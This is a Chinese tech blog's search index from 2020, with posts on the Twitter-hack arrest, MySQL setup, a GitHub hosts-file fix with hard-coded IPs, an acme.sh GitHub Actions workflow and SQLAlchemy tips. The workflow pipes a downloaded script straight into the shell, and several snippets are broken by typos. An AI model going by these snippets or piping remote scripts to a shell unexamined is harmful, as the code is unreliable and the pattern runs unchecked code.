<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>顶级黑客——天才少年被抓，将面临30项指控</title>
    <url>/2020/08/01/coding-6/</url>
    <content><![CDATA[<p>顶级黑客——天才少年被抓，将面临30项指控<br><a id="more"></a></p>
<p>之前，twitter各位名人大佬的twitter被黑，欺骗粉丝将比特币汇到同一个比特币账户中，大约造成了百万美金的损失。</p>
<p>而日前，这个大名鼎鼎的黑客被抓了，是在佛罗里达的17岁孩子Graham Ivan Clark。</p>
<p>真是英雄出少年。</p>
<p><img src="https://s1.ax1x.com/2020/08/01/a3Ya9K.png" alt="a3Ya9K.png"></p>
]]></content>
      <categories>
        <category>新闻</category>
      </categories>
  </entry>
  <entry>
    <title>IEEE Spectrum 2020度程序语言排行榜</title>
    <url>/2020/07/29/coding-5/</url>
    <content><![CDATA[<a id="more"></a>
<p>IEEE Spectrum 最近发布了 2020 年年度编程语言排行榜，从这个榜单中可以发现整个互联网世界的巨大改变。<br>和Tiobe排行榜不一样的IEEE Spectrum每年一发，而Tiobe是每月一发，主要通过媒体、搜索引擎和编程社区去判断排名的高低。</p>
<p>IEEE Spectrum 2020 编程语言 Top 10 如下：</p>
<p><img src="https://s1.ax1x.com/2020/07/29/am56Ig.jpg" alt="am56Ig.jpg"></p>
<p>Python 再度蝉联榜首，并且在各类不同的权重下都保持领先地位。Java 和 C 语言也依旧排名第二和第三。</p>
<p>除了机器学习、数据分析的流行，Python 高居此位也可以部分归因于其对教育领域的渗透。如今 Python 越来越多地被纳入教学安排，学生们反复搜索和查找相关知识，这在某种程度上膨胀了它的度量指标。</p>
<p>比较亮眼的是从第 11 位跃升至第 7 位的 Arduino，它鲜少出现在其他编程语言排行榜中。也许会有人认为，作为一个硬件平台，Arduino 不该被归为语言。IEEE Spectrum 则表示自己对“编程语言”的定义比较贴近实际：Arduino 基于 Wiring 和 C/C++，但 “现实是，当人们希望使用兼容 Arduino 的微控制器时，他们通常会搜索 ‘Arduino 代码’ 或购买有关 ‘Arduino 编程’ 的书，而不是 ‘Wiring 代码’ 或 ‘C 编程’ ”。</p>
<p>2020 年，无法绕开的 COVID-19 也在这份榜单中留下了痕迹。例如，将交互指标切换至 Twitter 后排名飙升至第 7 的 Cobol。这是一门相当古老的语言，多被用于一些比较重要且大型的商业数据处理领域。即便已经过时多年，多数金融业核心系统仍在使用 Cobol。系统庞大难修改是一方面，Cobol 的稳定性也使它的生命延期超乎寻常。</p>
<p>今年，受疫情影响，美国政府需要处理大量失业给付，但难以应付 Cobol 编写的老旧系统，许多地方的失业救济金系统不堪重负，非完全自动化的程序操作起来也很耗时耗力。因此，很多已退休的 Cobol 又返回来协助维护系统，Cobol 的创始团队还在网上公开了教程和学习资源。这则比较特别的新闻在那段时间引发了网络热议，Cobol 语言的讨论度迅速上升，这一切都被记录在榜单中。</p>
<p>完整排行信息可以查看 IEEE Spectrum 官网：<a href="https://spectrum.ieee.org/at-work/tech-careers/top-programming-language-2020" target="_blank" rel="noopener">https://spectrum.ieee.org/at-work/tech-careers/top-programming-language-2020</a></p>
]]></content>
  </entry>
  <entry>
    <title>表哥的故事：利用互联网的信息不对称成就伟大的事业</title>
    <url>/2020/07/29/zawen-2/</url>
    <content><![CDATA[<p>互联网的信息价值论<br><a id="more"></a></p>
<p>表哥的故事：利用完互联网的信息不对称后，离开它。</p>
<p>说说我表哥的故事：</p>
<p>2010 年小山村初中毕业考上了镇上的重点中学，家里人养猪款项下来了，高兴得上了头就给他从熟人手机店那里拿了部二手的摩托罗拉</p>
<p>他误打误撞接触到了贴吧——高考吧，对山村孩子来说打开了新世界的大门。看了很多励志的高考故事和经验-&gt;实践-&gt;反思-&gt;不做老师给的题目，只做自己需要的。因而走上了正反馈的路，普通班-&gt;尖子班-&gt;特尖班，高一排名 3000-&gt;高三前 10，最后上了 100 所 top5 之一。</p>
<p>由于家长的执念和自己的不坚定去了四大天坑，就开始刷知乎，发现有一个问题叫“华为给应届生开 1w，招的是什么应届生”，有了学 cs 的念头。大一认真上了半学期课，和各种师兄师姐打交道，搜各种资讯得出一个结论：现在的专业是个坑。决定转计算机。</p>
<p>过程很顺利，进大厂，有股票，娶妻生子</p>
<p>纵观表哥的故事，他每一步都踩在了节点上，通过互联网掌握了不对称信息的优势并充分利用</p>
<p>但他最近和我说，现在已经基本不存在这样的机会，要看远一些，求真一些：身体要健康，家庭要和睦，有稳定的收入。最重要的是：少上网。之前上网是像猎人一样打猎，找寻对自己有用的信息和机会；现在上网是当猎物，注意力成为别人的收入来源。</p>
<p>“我仍然会上网看网友侃侃而谈，缅怀打猎的时光。可我知道，我只是在假装猎人的一个猎物罢了。”</p>
<p>他说的对么</p>
]]></content>
  </entry>
  <entry>
    <title>CentOS 8上安装MySQL 8.0</title>
    <url>/2020/07/29/mysql-2/</url>
    <content><![CDATA[<p>mysql8.0 在centos8上的安装教程<br><a id="more"></a></p>
<p>通过dnf来安装 mysql，默认安装8.0版本<br><code>sudo dnf install @mysql</code></p>
<p>安装完成后，通过运行以下命令来启动MySQL服务并使其在启动时自动启动：<br><code>sudo systemctl enable --now mysqld</code></p>
<p>配置密码</p>
<p><code>sudo mysql_secure_installation</code></p>
<p>登录</p>
<p><code>mysql -u root -p</code></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>centos8</tag>
      </tags>
  </entry>
  <entry>
    <title>乱象之《平安经》节选</title>
    <url>/2020/07/29/zawen-1/</url>
    <content><![CDATA[<p>《平安经》节选，忍住不笑！<br><a id="more"></a></p>
<p><a href="https://imgchr.com/i/am2jMT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/29/am2jMT.jpg" alt="am2jMT.jpg"></a><br><a href="https://imgchr.com/i/am2qGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/29/am2qGq.jpg" alt="am2qGq.jpg"></a><br><a href="https://imgchr.com/i/am2bin" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/29/am2bin.jpg" alt="am2bin.jpg"></a></p>
<p><a href="https://imgchr.com/i/am2LR0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/29/am2LR0.md.jpg" alt="am2LR0.md.jpg"></a></p>
<h1 id="妇女之《不痛经》"><a href="#妇女之《不痛经》" class="headerlink" title="妇女之《不痛经》"></a>妇女之《不痛经》</h1><p><a href="https://imgchr.com/i/am2OzV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/29/am2OzV.md.jpg" alt="am2OzV.md.jpg"></a></p>
]]></content>
      <categories>
        <category>杂的文</category>
      </categories>
  </entry>
  <entry>
    <title>互联网前沿报导</title>
    <url>/2020/07/29/coding-4/</url>
    <content><![CDATA[<p>Ubuntu Web发布<br>Anaconda 2020.07 发布<br>微软、任天堂、华为海思等 50 余家知名企业源码遭泄露<br>Git 2.28.0 发布</p>
<a id="more"></a>
<p>开发人员 Rudra Saraswat 计划创建一个新的基于 Web 的操作系统。该操作系统名为 Ubuntu Web，旨在构建结合了 Ubuntu Linux 和 Mozilla Firefox 浏览器功能的 Chrome OS 替代操作系统。与 Chrome OS 不同的是，它基于 Firefox，用户可能可以在任何计算机上运行。</p>
<p><img src="https://s1.ax1x.com/2020/07/29/aVT5ct.jpg" alt="aVT5ct.jpg"></p>
<p>Python 科学计算包 Anaconda 发布 2020.07 版本，详细更新日志如下：</p>
<p>面向用户更改</p>
<p>新增基本安装环境 Python3.8，同时继续支持 Python3.6、3.7和3.8软件包。<br>修复32位安装程序安装64位系统可执行文件问题。<br>修复Windows安装程序会在具有64个以上内核导致系统挂起问题。<br>在GUI安装程序中更新PyCharm文本和链接。<br>更新EULA以反映repo.anaconda.com的服务条款更改。</p>
<p>据外媒 BleepingComputer 报道，由于基础架构配置有误，来自技术、金融、电商、制造业等众多领域的数十家知名公司源码遭到泄露。</p>
<p>这些公司包括微软、Adobe、联想，AMD、高通，摩托罗拉、海思、任天堂、迪士尼、江森自控等，而且这一名单还在不断增长中。</p>
<p>Git 2.28.0 现已发布，该版本更新包括有：继续进行的“master”默认分支命名工作，以及继续将 Git 使用的安全哈希算法从 SHA-1 迁移到 SHA-256 。</p>
<p>具体一些亮点内容如下：</p>
<p>在 Git 2.28 中，引入了一个新的配置选项 init.defaultBranch 来代替 hard-coded 术语。从 Git 2.28 开始，当在新存储库中创建第一个分支时，git init 将改为查找 init.defaultBranch 的值。 如果未设置该值，则 init.defaultBranch 默认为 master。<br>在 Git 2.27 中，commit-graph 文件格式已扩展为存储更改路径的 Bloom 过滤器。从某种意义上说，这些新信息可以帮助 Git 更快地找到历史上与给定路径接触的点（例如 git log – <path> 或 git blame）。 Git 2.28 利用这些优化来提供了一些可观的性能改进。<br>Git 现在包括一个 GitHub Actions workflow，用户可以使用它在各种平台和编译器上运行 Git 自己的集成测试。<br>现在，当用户遇到一个错误时，可以通过运行 git bugreport 来与 Git 邮件列表进行互动。</path></p>
]]></content>
      <categories>
        <category>新闻</category>
      </categories>
  </entry>
  <entry>
    <title>快速解决GitHub图裂和速度慢的问题</title>
    <url>/2020/06/28/github-2/</url>
    <content><![CDATA[<p>一键解决GitHub速度慢、无法访问的问题<br><a id="more"></a></p>
<p>有时，GitHub因为种种原因导致无法正常访问，我们需要修改本地的hosts文件即可加速github访问和git clone</p>
<h1 id="Windows用户"><a href="#Windows用户" class="headerlink" title="Windows用户"></a>Windows用户</h1><p>对于windows系统来说，找到<code>C:\Windows\System32\drivers\etc\hosts</code></p>
<p>添加或者修改以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入以下内容：</span><br><span class="line"></span><br><span class="line">日期：2020/6/24 搜查到新的地址和IP 已经实时更新！</span><br><span class="line">#GitHub Start</span><br><span class="line">140.82.112.3 github.com</span><br><span class="line">140.82.113.3 gist.github.com</span><br><span class="line">185.199.108.153 assets-cdn.github.com</span><br><span class="line">199.232.68.133 raw.githubusercontent.com</span><br><span class="line">199.232.68.133 gist.githubusercontent.com</span><br><span class="line">199.232.68.133 cloud.githubusercontent.com</span><br><span class="line">199.232.68.133 camo.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars0.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars1.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars2.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars3.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars4.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars5.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars6.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars7.githubusercontent.com</span><br><span class="line">199.232.68.133 avatars8.githubusercontent.com</span><br><span class="line">#GitHub End</span><br></pre></td></tr></table></figure>
<p>如果无法修改的话，请修改权限给用户赋予修改文件的权限</p>
<h1 id="mac用户"><a href="#mac用户" class="headerlink" title="mac用户"></a>mac用户</h1><p>对于mac用户来说</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>在系统偏好设置中修改即可</p>
<p>1.打开系统偏好设置，底部有一个Hosts的快捷入口<br>2.输入ip和hostname后，回车确定，勾选改host即可</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>在终端中修改即可</p>
<p><code>sudo vi /etc/hosts</code></p>
<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>通过Finder直接修改即可</p>
<p>打开Finder，按快捷键组合 Shift+Command+G 查找文件，输入/etc/hosts,确认前往修改即可</p>
<h1 id="Linux-修改hosts文件"><a href="#Linux-修改hosts文件" class="headerlink" title="Linux 修改hosts文件"></a>Linux 修改hosts文件</h1><p>Linux中添加或修改hosts的方法</p>
<p>vim打开 /etc/hosts，添加或修改hosts之后保存:</p>
<p><code>vim /etc/hosts</code><br>重启网络:</p>
<p><code>/etc/init.d/networking restart</code></p>
]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
  </entry>
  <entry>
    <title>Linus Torvalds 公开其最新 Linux 开发 PC 的所有配置</title>
    <url>/2020/06/03/joke-7/</url>
    <content><![CDATA[<p>Linus Torvalds 公开其最新 Linux 开发 PC 的所有配置<br><a id="more"></a></p>
<p>Linus Torvalds PC 规格的完整列表如下：</p>
<p>CPU — AMD RyzenThreadripper 3970X<br>主板 —技嘉 Aorus TRX40 Master<br>Fan — Noctua NF-A14 PWM，高级静音风扇<br>CPU 散热片 — Noctua NH-U14S 和 Noctua NF-A15<br>Case — Be Quiet Dark Ba​​se 700<br>Extra Fan — Silent Wings 3<br>电源设备 — Seasonic Focus GX-850<br>Storage — 1TB SamsungEVO 970<br>Memory — 4x16GB DDR4-2666<br>Linux distro — Fedora 32<br>笔记本电脑 — Dell XPS 13</p>
]]></content>
  </entry>
  <entry>
    <title>Github Action 部署 acme.sh 全自动批量签发多域名证书教程</title>
    <url>/2020/06/03/joke-5/</url>
    <content><![CDATA[<p>Github Action 部署 acme.sh 全自动批量签发多域名证书教程<br><a id="more"></a></p>
<p>适用场景<br>本方案适用于多个域名,不同 dns 服务商,多域名证书合并等运维环境需求.<br>例如:一台服务器上部署了多个不同域名,甚至每个域名都不是同一 DNS 解析服务商,那么acme.sh程序无法全自动续签和部署每一个域名.此时就可以使用本工作流来实现批量申请,最后在通过编写一个shell脚本,利用crontab来定时批量部署证书,重启 nginx 等 Web 服务器.</p>
<p>如果你的服务器环境相对稳定单一,域名也只有一个,请直接使用官方acme.sh程序在服务器上安装部署,即可达到自动申请和到期续签的需求.<br>基本流程<br>GitHub Action 每月定时触发一次<br>根据配置文件签发各证书<br>自动打包所有证书<br>可选 Commit 和 Push 到当前仓库<br>可选 附件形式 Email 到指定邮箱<br>准备工作<br>域名 API KEY<br>根据 acme.sh 官方项目文档获取自己域名的 API KEY ,具体请参考本文结尾的链接.其示例参考如下:</p>
<p>export DP_Id=”xxxxx”<br>export DP_Key=”xxxxxxxxxxxxxxxxxx”<br>export CF_Token=”xxxxxxxxxxxxxxxxxxx”<br>export CF_Account_ID=”xxxxxxxxxxxxxxxxxxxxxxxxx”<br>邮件 SMTP 服务器信息 (可选)<br>如果你的仓库为公开仓库,为避免证书私钥泄漏,可以配置邮件发送到邮箱.<br>如果是私有仓库,签发的证书可以自动 Commit 并 Push 到本仓库.</p>
<p>配置流程<br>配置 Secret<br>可以在任意已存在的仓库配置工作流,也可以单独新建一个仓库来专门管理域名证书.<br>在仓库的 Settings 中添加 Secret</p>
<p>DNSAPI<br>创建 DNSAPI 填写上文获取的 API KEY</p>
<p>MAILUSERNAME<br>创建 MAILUSERNAME 填写 SMTP 服务器的发件邮箱</p>
<p>MAILPASSWORD<br>创建 MAILPASSWORD 填写 SMTP 服务器的邮箱密码</p>
<p>更新配置<br>如果后期需要更新 API 或 SMTP 相关信息可以在此 Update 更新</p>
<p>配置 GitHub Action<br>在仓库中创建 .github/workflows目录,在其目录下创建AutoACME.yml配置文件,参考复制粘贴如下.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name: Auto ACME</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  schedule:</span><br><span class="line">    - cron: &quot;0 2 1 * *&quot;</span><br><span class="line">  watch:</span><br><span class="line">    types: [started]</span><br><span class="line"></span><br><span class="line">env:</span><br><span class="line">    ACME: /home/runner/.acme.sh/acme.sh</span><br><span class="line">    DNSAPI: $&#123;&#123; secrets.DNSAPI &#125;&#125;</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    if: github.event.repository.owner.id == github.event.sender.id</span><br><span class="line">    steps:</span><br><span class="line">    - name: Checkout</span><br><span class="line">      uses: actions/checkout@v2</span><br><span class="line">    - name: Install &amp; Configure ACME.SH</span><br><span class="line">      run: |</span><br><span class="line">        curl  https://get.acme.sh | sh</span><br><span class="line">        echo &quot;$DNSAPI&quot; &gt;&gt; /home/runner/.acme.sh/account.conf</span><br><span class="line">    - name: Issue &amp; Deploy Certificates</span><br><span class="line">      run: |</span><br><span class="line">        mkdir -p ./ssl</span><br><span class="line">        $ACME --issue --dns dns_dp -d ioiox.com -d *.ioiox.com</span><br><span class="line">        $ACME --installcert -d ioiox.com --key-file ./ssl/ioiox.com.key --fullchain-file ./ssl/ioiox.com.cer</span><br><span class="line">        $ACME --issue --dns dns_cf -d ioiox.xyz -d *.ioiox.xyz</span><br><span class="line">        $ACME --installcert -d ioiox.xyz --key-file ./ssl/ioiox.xyz.key --fullchain-file ./ssl/ioiox.xyz.cer</span><br><span class="line">        zip -r ssl.zip ssl</span><br><span class="line">    - name: Commit</span><br><span class="line">      run: |</span><br><span class="line">        git config --global user.email AutoupdateRobot@email.com</span><br><span class="line">        git config --global user.name AutoupdateRobot</span><br><span class="line">        git add ./ssl/</span><br><span class="line">        git commit -m &quot;Update certificate files&quot; -a</span><br><span class="line">    - name: Push</span><br><span class="line">      uses: ad-m/github-push-action@master</span><br><span class="line">      with:</span><br><span class="line">        github_token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">    - name: Send mail</span><br><span class="line">      uses: dawidd6/action-send-mail@v2</span><br><span class="line">      with:</span><br><span class="line">        server_address: smtp.qiye.aliyun.com</span><br><span class="line">        server_port: 465</span><br><span class="line">        username: $&#123;&#123; secrets.MAILUSERNAME &#125;&#125;</span><br><span class="line">        password: $&#123;&#123; secrets.MAILPASSWORD &#125;&#125;</span><br><span class="line">        subject: GitHub Actions Auto ACME</span><br><span class="line">        body: Build job of $&#123;&#123;github.repository&#125;&#125; completed successfully!</span><br><span class="line">        to: stille@ioiox.com</span><br><span class="line">        from: GitHub Actions Auto ACME</span><br><span class="line">        attachments: ./ssl.zip</span><br></pre></td></tr></table></figure></p>
<p>Action 详情<br>此配置文件中的name为整个工作流步骤.分别为:</p>
<p>Checkout 标准检出操作,用于 clone 仓库文件方便后续 Commit 和 Push .<br>Install &amp; Configure ACME.SH 安装 acme.sh 并根据创建的 Secret 配置 DNSAPI<br>Issue &amp; Deploy Certificates 申请证书并压缩以便 Email 附件<br>Commit 公共仓库请删除该段<br>Push 公共仓库请删除该段<br>Send mail 根据需求配置邮件通知或发送证书附件.<br>修改部分参数申请证书<br>Issue &amp; Deploy Certificates<br>本文示例申请ioiox.com和ioiox.xyz两个域名的泛域名证书:<br>该两个域名服务商分别为dnspod.cn和cloudflare,上文DNSAPI中同时填写了两个服务商的 API KEY.<br>–issue为申请证书命令<br>–installcert为部署证书,用于把申请的证书移动到ssl目录,方便打包发送邮件.<br>以上两条命令为一组,根据自身申请域名的多少自行添加.<br>最后一条zip命令为压缩邮件附件所用,如果无需可以删除.</p>
<p>根据实际情况修改本段中的域名和 dns 类型.具体的 dns 支持可以参考本文结尾的链接.在此你可以根据示例添加多个域名.</p>
<p>定时触发<br>工作流已配置每月1日UTC时间凌晨2点,即北京时间10点自动运行.同时当仓库所有者点击star也会触发工作流运行.</p>
<p>测试使用<br>一切配置完毕即可star启动运行,检测各步骤是否正常.后续工作流将定时自动运行.</p>
<p>成功运行完成</p>
<p>自动 Commit 并 Push 到仓库</p>
<p>收到含证书附件的邮件</p>
<p>原文地址——<a href="https://www.ioiox.com/archives/104.html" target="_blank" rel="noopener">https://www.ioiox.com/archives/104.html</a></p>
]]></content>
      <categories>
        <category>github</category>
      </categories>
  </entry>
  <entry>
    <title>最新红警开源项目——学习编程必备</title>
    <url>/2020/06/03/joke-6/</url>
    <content><![CDATA[<p>红警源代码<br><a id="more"></a></p>
<p><a href="https://github.com/electronicarts/CnC_Remastered_Collection/tree/master/TIBERIANDAWN" target="_blank" rel="noopener">项目地址</a></p>
]]></content>
  </entry>
  <entry>
    <title>如何快速测试app性能——最强物理方法</title>
    <url>/2020/06/03/joke-4/</url>
    <content><![CDATA[<p>利用 MacBook 风扇噪音判断 Android 应用性能<br><a id="more"></a></p>
<p>独家小技巧，开模拟器调试 Android 程序时，如果 MacBook 风扇声音线性增大并保持呼呼作响，伴随 touch bar 发烫，表示你的 Android 应用需要优化了，要么有耗时操作，要么有太多动画耗费资源。</p>
]]></content>
      <categories>
        <category>编程趣事</category>
      </categories>
  </entry>
  <entry>
    <title>python sqlalchemy的联合唯一的使用</title>
    <url>/2020/05/17/python-7/</url>
    <content><![CDATA[<p>sqlalchemy联合唯一的使用<br><a id="more"></a></p>
<p>from sqlalchemy import UniqueConstraint</p>
<p>UniqueConstraint(‘name’,’age’),#姓名和年龄唯一</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/python-6/">flaskd的sqlalchemy的高级用法</a></li></ul></div>]]></content>
      <categories>
        <category>sqlalchemy</category>
      </categories>
      <tags>
        <tag>sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>flaskd的sqlalchemy的高级用法</title>
    <url>/2020/05/17/python-6/</url>
    <content><![CDATA[<p>flaskd的sqlalchemy的高级用法，最全面的sqlalchemy关键常用知识点总结<br><a id="more"></a></p>
<h1 id="sqlalchemy的exist用法"><a href="#sqlalchemy的exist用法" class="headerlink" title="sqlalchemy的exist用法"></a>sqlalchemy的exist用法</h1><p>判断是否存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from sqlalchemy.sql import exists</span><br><span class="line">session.query(User.name).filter(~exists().where(User.role_id == Role.id)).scalar()</span><br><span class="line">结果返回 true 或者 false</span><br></pre></td></tr></table></figure>
<h1 id="sqlalchemy的func用法"><a href="#sqlalchemy的func用法" class="headerlink" title="sqlalchemy的func用法"></a>sqlalchemy的func用法</h1><p>from sqlalchemy.sql import func</p>
<p>• func.count：统计行的数量。<br>• func.avg：求平均值。<br>• func.max：求最大值。<br>• func.min：求最小值。<br>• func.sum：求和。</p>
<h1 id="group-by-分组查询和过滤"><a href="#group-by-分组查询和过滤" class="headerlink" title="group_by 分组查询和过滤"></a>group_by 分组查询和过滤</h1><p>session.query(User.gender,func.count(User.id)).group_by(User.gender).all()</p>
<p>result = session.query(User.age,func.count(User.id)).group_by(User.age).having(User.age &gt;= 18).all()</p>
<p>group_by 使用的是having 使用filter是不可以的</p>
<h1 id="sqlalchemy使用-sql语句"><a href="#sqlalchemy使用-sql语句" class="headerlink" title="sqlalchemy使用 sql语句"></a>sqlalchemy使用 sql语句</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stmt = text(&quot;SELECT name, id, fullname, nickname &quot;</span><br><span class="line">...             &quot;FROM users where name=:name&quot;)</span><br><span class="line">stmt = stmt.columns(User.name, User.id, User.fullname, User.nickname)</span><br><span class="line">session.query(User).from_statement(stmt).params(name=&apos;ed&apos;).all()</span><br><span class="line">[&lt;User(name=&apos;ed&apos;, fullname=&apos;Ed Jones&apos;, nickname=&apos;eddie&apos;)&gt;]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from sqlalchemy import text</span><br><span class="line">for user in session.query(User).filter(text(&quot;id&lt;244&quot;)).order_by(text(&quot;id&quot;)).all():</span><br><span class="line">    print user.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session.query(User).filter(text(&quot;id&lt;:value and name=:name&quot;)).params(value=224,name=&apos;ed&apos;).order_by(User.id)</span><br><span class="line"></span><br><span class="line">sesseion.query(User).from_statement(text(&quot;select * from users where name=:name&quot;)).(name=&apos;ed&apos;).all()</span><br></pre></td></tr></table></figure>
<p>from_statement+text+params 可以使用原生sql语句进行查询</p>
<h1 id="subquery子查询"><a href="#subquery子查询" class="headerlink" title="subquery子查询"></a>subquery子查询</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stmt = session.query(User.city.label(&quot;city&quot;),User.age.label(&quot;age&quot;)).filter(User.username==&apos;李A&apos;).subquery()</span><br><span class="line">result = session.query(User).filter(User.city==stmt.c.city,User.age==stmt.c.age).all()</span><br></pre></td></tr></table></figure>
<p>子查询可以让多个查询变成一个查询，只要查找一次数据库，性能相对来讲更加高效一点。不用写多个sql语句就可以实现一些复杂的查询。那么在sqlalchemy中，要实现一个子查询，应该使用以下几个步骤：</p>
<h1 id="sqlalchemy的label用法"><a href="#sqlalchemy的label用法" class="headerlink" title="sqlalchemy的label用法"></a>sqlalchemy的label用法</h1><p>用于subquery子查询或者是对单字段的查询</p>
<h1 id="MySQL的事务隔离级别"><a href="#MySQL的事务隔离级别" class="headerlink" title="MySQL的事务隔离级别"></a>MySQL的事务隔离级别</h1><p>Serializable 串行化，一个事务一个事务的执行</p>
<p>Repeatable read 可重复读，无论其他事务是否修改并提交了数据，在这个事务中看到的数据值始终不受其他事务影响</p>
<p>Read committed 读取已提交，其他事务提交了对数据的修改后，本事务就能读取到修改后的数据值</p>
<p>Read uncommitted 读取为提交，其他事务只要修改了数据，即使未提交，本事务也能看到修改后的数据值。</p>
<p>MySQL数据库默认使用可重复读（ Repeatable read），而使用乐观锁的时候，如果一个事务修改了库存并提交了事务，那其他的事务应该可以读取到修改后的数据值，所以不能使用可重复读的隔离级别，应该修改为读取已提交Read committed。</p>
<h1 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h1><p>乐观锁并不是真实存在的锁，而是在更新的时候判断此时的库存是否是之前查询出的库存，如果相同，表示没人修改，可以更新库存，否则表示别人抢过资源，不再执行库存更新。类似如下操作</p>
<p>来自 <a href="https://blog.csdn.net/hello_mumu/article/details/82253456" target="_blank" rel="noopener">https://blog.csdn.net/hello_mumu/article/details/82253456</a><br>rom django.http import HttpResponse<br>from rest_framework.generics import GenericAPIView<br>from app01.models import GoodsInfo</p>
<p>class Goods(GenericAPIView):<br>    “”” 购买商品 “””<br>    def post(self, request):</p>
<pre><code># 获取请求头中查询字符串数据
goods_id = request.GET.get(&apos;goods_id&apos;)
count = int(request.GET.get(&apos;count&apos;))

while True:
    # 查询商品对象
    goods = GoodsInfo.objects.filter(id=goods_id).first()
    # 获取原始库存
    origin_stock = goods.stock

    # 判断商品库存是否充足
    if origin_stock &lt; count:
        return HttpResponse(content=&quot;商品库存不足&quot;, status=400)

    # 演示并发请求
    import time
    time.sleep(5)

    # 减少商品的库存数量，保存到数据库
    # goods.stock = origin_stock - count
    # goods.save()
    &quot;&quot;&quot; 使用乐观锁进行处理，一步完成数据库的查询和更新 &quot;&quot;&quot;
    # update返回受影响的行数
    result = GoodsInfo.objects.filter(id=goods.id, stock=origin_stock).update(stock=origin_stock - count)
    if result == 0:
        # 表示更新失败，有人抢先购买了商品，重新获取库存信息，判断库存
        continue

    # 表示购买成功，退出 while 循环
    break

return HttpResponse(content=&quot;操作成功&quot;, status=200)
</code></pre><h1 id="sqlalchemy悲观锁-with-for-update"><a href="#sqlalchemy悲观锁-with-for-update" class="headerlink" title="sqlalchemy悲观锁 with_for_update"></a>sqlalchemy悲观锁 with_for_update</h1><p>业务中有个需求，就是可能会遇到并发读取某一行数据，然后修改这行数据，这时候就涉及到并发的锁了</p>
<p>比如：</p>
<p>address表有个user_id=3的字段的status如果为0则要update，为1则不需要，如果没有锁，当两个session同时访问到user_id为3的字段时，此时status都为0，那么两个session都会对数据库做一次update，这等于update了两次，那么怎么避免这种情况呢？就要用到with_for_update()方法了：</p>
<p>下面是session1的代码</p>
<p>session1:</p>
<p>addr = Address.query.filter_by(user_id=3).with_for_update().first<br>if addr.status == 0:<br>    addr.status = 1<br>db.session.commit()<br>下面是session2的代码：</p>
<p>session2:</p>
<p>addr = Address.query.filter_by(user_id=3).with_for_update().first<br>if addr.status == 0:<br>    addr.status = 1<br>db.session.commit()<br>那么当session1抢先拿到锁的时候，在执行到最后的commit之前，session2都会卡住，当session1释放锁，session2拿到锁之后，status已经改为1了.</p>
<h2 id="注意一旦使用with-for-update，对于查询事件也是限制锁"><a href="#注意一旦使用with-for-update，对于查询事件也是限制锁" class="headerlink" title="注意一旦使用with_for_update，对于查询事件也是限制锁"></a>注意一旦使用with_for_update，对于查询事件也是限制锁</h2><h1 id="relationship可以使用order-by-对多的一边进行排序"><a href="#relationship可以使用order-by-对多的一边进行排序" class="headerlink" title="relationship可以使用order_by 对多的一边进行排序"></a>relationship可以使用order_by 对多的一边进行排序</h1><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/python-7/">python sqlalchemy的联合唯一的使用</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>javascrip js原生base64互转方法</title>
    <url>/2020/05/17/js-4/</url>
    <content><![CDATA[<p>不用第三方组件的javascrip的base64互转方法<br><a id="more"></a></p>
<p>之前不太了解js，用了很多第三方的组件来实现base64的互转<br>而js可以通过原生的方法实现base64的互转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JavaScript 原生提供两个 Base64 相关的方法。</span><br><span class="line">	• btoa()：任意值转为 Base64 编码</span><br><span class="line">	• atob()：Base64 编码转为原来的值</span><br><span class="line"></span><br><span class="line">var string = &apos;Hello World!&apos;;</span><br><span class="line">btoa(string) // &quot;SGVsbG8gV29ybGQh&quot;</span><br><span class="line">atob(&apos;SGVsbG8gV29ybGQh&apos;) // &quot;Hello World</span><br></pre></td></tr></table></figure>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/js-3/">js日期对象用法,js的Date用法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-2/">js的ajax用法和jsonp用法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-1/">js获取验证码倒计时</a></li></ul></div>]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
